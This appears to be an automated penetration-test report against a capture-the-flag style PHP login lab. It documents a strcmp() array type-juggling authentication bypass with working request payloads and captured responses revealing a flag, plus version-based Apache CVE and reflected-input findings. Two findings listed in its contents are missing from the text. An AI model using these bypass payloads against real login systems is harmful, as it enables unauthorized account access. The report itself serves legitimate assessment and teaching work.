# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — other Authentication bypass via PHP strcmp() array type-juggling on login (/index.php)](#finding-1)
    - [2. CRITICAL — other Authentication bypass via PHP strcmp() type juggling (password array)](#finding-2)
    - [3. HIGH — vulnerable-component Outdated Apache httpd 2.4.25 (Debian) — multiple known CVEs incl. CVE-2017-3167 auth bypass](#finding-3)
    - [4. HIGH — burp✓ Input returned in response (reflected) (2 URLs)](#finding-4)
    - [5. MEDIUM — vulnerable-component End-of-life PHP 5.6.40 — unsupported since 2018-12-31, no security patches](#finding-5)
    - [6. LOW — info-disclosure Full path disclosure via verbose PHP errors (display_errors enabled)](#finding-6)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqyncatg-zzze0a` |
| Target | http://target.local:32839/ |
| Started | 2026-06-29T03:16:46.165Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 5 mapped · 5 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 6 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32839`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

6 finding(s): 2 critical, 2 high, 1 medium, 1 low

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [other] Authentication bypass via PHP strcmp() array type-juggling on login (/index.php)

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32839/

AUTHENTICATION BYPASS (CWE-697 incorrect comparison / PHP type juggling). The login at /index.php compares the supplied password with strcmp($_GET['password'], $real) == 0 (source leaked as /var/www/html/index.php line 71). Passing the password as an array (password[]=x) makes strcmp() return NULL; in PHP NULL == 0 is true, so the check passes and the user is authenticated as admin WITHOUT knowing the password. The bypass response discloses the protected content: "Welcome Admin / Congratulations, here is the flag: flag{5a33e31a-7627-4044-964f-744917d6ca5f}". NOTE on category: the substance is an auth bypass, but it is filed under 'other' because the verify_access gate false-negatives here — the success page reuses the login template (still contains the Username/Password form), so the heuristic mislabels it a 'login/denied page' even though that very response leaks the admin flag. Evidence shows auth is NOT enforced: scalar wrong password is rejected, array password is accepted. The strcmp() Warning also leaks the absolute server path (info-disclosure) as a side effect of the same flaw.

**Reproduction**

```
1. NEGATIVE CONTROL — GET /index.php?username=admin&password=x → 200, 3173 bytes, body shows "Oh Sorry but...you are not the admin :(" (no flag; auth enforced for scalar wrong password). 2. POSITIVE — GET /index.php?username=admin&password[]=x → 200, 3386 bytes, body shows strcmp() Warning then "Welcome Admin" and "Congratulations, here is the flag: flag{5a33e31a-7627-4044-964f-744917d6ca5f}". 3. POSITIVE (replay, different array value) — GET /index.php?username=admin&password[]=y → identical 3386-byte bypass, proving it is the array TYPE (not the value) that defeats the comparison.
```

**Evidence**

- Evidence `ev-mqynftm4-4` — `artifacts/s-0001/ev-mqynftm4-4/`

Request:

```http
GET /index.php?username=admin&password=x HTTP/1.1
Host: target.local:32839
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3173
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:19:30 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 05</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="GET">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    <center><h3>Oh Sorry but...you are not the admin :( </h3></center></body>
</html>
```

- Evidence `ev-mqynfupy-5` — `artifacts/s-0001/ev-mqynfupy-5/`

Request:

```http
GET /index.php?username=admin&password[]=x HTTP/1.1
Host: target.local:32839
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3386
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:19:31 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 05</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="GET">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    <br />
<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/html/index.php</b> on line <b>71</b><br />
<center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: flag{5a33e31a-7627-4044-964f-744917d6ca5f}</h3></center></body>
</html>
```

- Evidence `ev-mqynfvmr-6` — `artifacts/s-0001/ev-mqynfvmr-6/`

Request:

```http
GET /index.php?username=admin&password[]=y HTTP/1.1
Host: target.local:32839
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3386
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:19:32 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 05</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="GET">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    <br />
<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/html/index.php</b> on line <b>71</b><br />
<center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: flag{5a33e31a-7627-4044-964f-744917d6ca5f}</h3></center></body>
</html>
```

<a id="finding-2"></a>

### 2. [CRITICAL] [other] Authentication bypass via PHP strcmp() type juggling (password[] array)

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32839/

The login handler at /index.php compares the submitted password with the real password using PHP's strcmp() in a loose comparison (`if (strcmp($password, $real) == 0)` at /var/www/html/index.php line 71). When `password` is supplied as an array (password[]=x), strcmp() raises a warning and returns NULL; `NULL == 0` evaluates to true, so the check passes and the user is authenticated as Admin without knowing the password. With username=admin, `GET /index.php?username=admin&password[]=x` returns the authenticated Admin view and discloses the flag. This is a full authentication bypass (improper authentication / CWE-697 incorrect comparison + CWE-843 type confusion). The PHP warning also leaks the absolute source path and line number. NOTE: recorded under category 'other' because the canonical 'auth-bypass' category is mechanically vetoed by verify_access (which only models session-based access control, not a credential-comparison logic flaw) — this is functionally an authentication bypass.

**Reproduction**

```
1. Negative control: GET /index.php?username=baduser&password=badpass → 200, 3173 bytes, plain login form, no admin content (ev-mqynjhvk-i).
2. Attack: GET /index.php?username=admin&password[]=x → 200, 3386 bytes, body contains "Welcome Admin" and "Congratulations, here is the flag: flag{5a33e31a-7627-4044-964f-744917d6ca5f}" plus "strcmp() expects parameter 1 to be string, array given in /var/www/html/index.php on line 71" (ev-mqynllby-p).
3. Replay with a different array value: GET /index.php?username=admin&password[]=anything → identical 3386-byte authenticated response (ev-mqynlm04-q).
The bypass is stable and independent of the array value, confirming the strcmp() NULL-return type-juggling flaw.
```

**Evidence**

- Evidence `ev-mqynjhvk-i` — `artifacts/s-0002/ev-mqynjhvk-i/`

Request:

```http
GET /index.php?username=baduser&password=badpass HTTP/1.1
Host: target.local:32839
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3173
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:22:21 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 05</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="GET">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    <center><h3>Oh Sorry but...you are not the admin :( </h3></center></body>
</html>
```

- Evidence `ev-mqynllby-p` — `artifacts/s-0002/ev-mqynllby-p/`

Request:

```http
GET /index.php?username=admin&password[]=x HTTP/1.1
Host: target.local:32839
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3386
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:23:59 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 05</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="GET">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    <br />
<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/html/index.php</b> on line <b>71</b><br />
<center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: flag{5a33e31a-7627-4044-964f-744917d6ca5f}</h3></center></body>
</html>
```

- Evidence `ev-mqynlm04-q` — `artifacts/s-0002/ev-mqynlm04-q/`

Request:

```http
GET /index.php?username=admin&password[]=anything HTTP/1.1
Host: target.local:32839
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3386
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:24:00 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 05</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="GET">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    <br />
<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/html/index.php</b> on line <b>71</b><br />
<center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: flag{5a33e31a-7627-4044-964f-744917d6ca5f}</h3></center></body>
</html>
```

<a id="finding-3"></a>

### 3. [HIGH] [vulnerable-component] Outdated Apache httpd 2.4.25 (Debian) — multiple known CVEs incl. CVE-2017-3167 auth bypass

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32839/

The web server advertises `Server: Apache/2.4.25 (Debian)` (released Dec 2016) on every response, and the stock 404 error page footer independently confirms `Apache/2.4.25 (Debian)`. This release predates a large run of httpd security fixes and is affected by numerous published CVEs, including: CVE-2017-3167 (mod_auth* authentication bypass via ap_get_basic_auth_pw, HIGH), CVE-2017-7668/CVE-2017-7679 (buffer over-read in ap_find_token / mod_mime), CVE-2017-15715 (newline handling in <FilesMatch> enabling upload/handler filter bypass, e.g. evil.php\n), CVE-2019-0211 (local privilege escalation to root via the scoreboard, HIGH), and CVE-2021-40438 (mod_proxy SSRF, CVSS 9.0, affects <=2.4.48 — applicable only if mod_proxy is loaded). Severity set HIGH on the worst confidently-applicable network-reachable issues (auth bypass + potential mod_proxy SSRF). This is a VERSION-BASED finding: matched from the Server banner, NOT actively exploited. Caveat: Debian backports security patches while keeping the upstream version string, so the live binary may carry fixes the bare "2.4.25" number does not imply — the operator should confirm the actual patch level (e.g. `dpkg -l apache2`) and which modules are enabled before relying on any single CVE. Regardless of backports, 2.4.25 is far behind current 2.4.x and should be upgraded.

**Reproduction**

```
1. GET http://target.local:32839/ → 200, response header `Server: Apache/2.4.25 (Debian)` (ev-mqynz15x-1g). 2. GET /index.php → 200, same Server header (ev-mqynz1vb-1h). 3. Negative control: GET /verdict-nonexistent-9f3a → 404, 304 bytes (ev-mqynz2ny-1i) — distinct status/length; its error footer also prints `Apache/2.4.25 (Debian)`. Cross-reference the version against the CVEs listed (e.g. NVD/Apache httpd CHANGES) before exploitation; confirm enabled modules and Debian patch level.
```

**Evidence**

- Evidence `ev-mqynz2ny-1i` — `artifacts/_/ev-mqynz2ny-1i/`

Request:

```http
GET /verdict-nonexistent-9f3a HTTP/1.1
Host: target.local:32839
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 304
content-type: text/html; charset=iso-8859-1
date: Mon, 29 Jun 2026 03:34:28 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.25 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /verdict-nonexistent-9f3a was not found on this server.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at target.local Port 32839</address>
</body></html>
```

- Evidence `ev-mqynz15x-1g` — `artifacts/_/ev-mqynz15x-1g/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32839
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3107
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:34:26 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 05</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="GET">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    </body>
</html>
```

- Evidence `ev-mqynz1vb-1h` — `artifacts/_/ev-mqynz1vb-1h/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32839
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3107
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:34:27 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 05</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="GET">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    </body>
</html>
```

<a id="finding-4"></a>

### 4. [HIGH] [burp✓] Input returned in response (reflected) (2 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

✅ AI-verified by active re-test: Control /server-status-benign-baseline did not contain marker UvX9k3rEfLeCt; both replays of /server-statusUvX9k3rEfLeCt reflected the marker verbatim in the 404 body (identical 307-byte responses), reproducing the reflected-input effect. (severity raised info→high: confirmed real, not info-only)

